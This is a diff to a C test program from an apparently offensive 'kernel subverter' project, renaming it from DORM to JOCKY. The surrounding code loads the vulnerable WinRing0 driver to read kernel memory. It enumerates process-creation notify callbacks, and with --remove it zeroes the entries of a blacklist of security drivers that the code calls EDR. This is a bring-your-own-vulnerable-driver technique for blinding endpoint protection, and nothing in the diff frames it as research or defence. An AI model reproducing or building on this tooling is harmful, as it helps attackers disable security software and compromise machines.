@@ -1,5 +1,5 @@
-/*
- * test_byovd.c — DORM Phase 14: BYOVD Verification + Diagnostic
+﻿/*
+ * test_byovd.c — JOCKY Phase 14: BYOVD Verification + Diagnostic
  * byovd/kernel_subverter/test_byovd.c
  *
  * Windows x64 | MinGW/Clang
@@ -28,7 +28,7 @@
  *   14.2  byovd_open()                  — device handle
  *   14.2b byovd_find_ntoskrnl_phys()    — VA→PA physical scan  [WinRing0 only]
  *   14.3  byovd_read8(kernel_base)      — MZ sanity check
- *   14.4  dorm_enum / remove callbacks  — PspCreateProcessNotifyRoutine
+ *   14.4  JOCKY_enum / remove callbacks  — PspCreateProcessNotifyRoutine
  */
 
 #include <stdio.h>
@@ -304,14 +304,14 @@ int main(int argc, char **argv)
         else driver_path = argv[i];
     }
 
-    printf("DORM Phase 14 — BYOVD Kernel Subversion\n");
+    printf("JOCKY Phase 14 — BYOVD Kernel Subversion\n");
     printf("backend: %s\n", DIAG_BACKEND_NAME);
     printf("=========================================\n\n");
 
     if (!is_elevated()) {
         printf("[!] NOT elevated — run from Administrator PowerShell:\n");
         printf("[!]   Win+X -> Windows Terminal (Admin)\n");
-        printf("[!]   cd D:\\Dinku\\projects\\DORM\n");
+        printf("[!]   cd D:\\Dinku\\projects\\JOCKY\n");
         printf("[!]   .\\test_byovd.exe .\\WinRing0x64.sys\n");
         printf("\nPress Enter to exit...\n"); getchar();
         return 1;
@@ -454,12 +454,12 @@ int main(int argc, char **argv)
             "klflt.sys",
             "eaw.sys",
         };
-        cb_count = dorm_remove_process_callbacks(
+        cb_count = JOCKY_remove_process_callbacks(
                        bl, (int)(sizeof(bl) / sizeof(bl[0])),
                        "callbacks.json");
         printf("[14.4] %d callbacks found, blacklisted entries zeroed\n\n", cb_count);
     } else {
-        cb_count = dorm_enum_process_callbacks("callbacks.json");
+        cb_count = JOCKY_enum_process_callbacks("callbacks.json");
         printf("[14.4] %d process notify callbacks enumerated\n", cb_count);
         printf("        pass --remove to zero blacklisted EDR entries\n\n");
     }
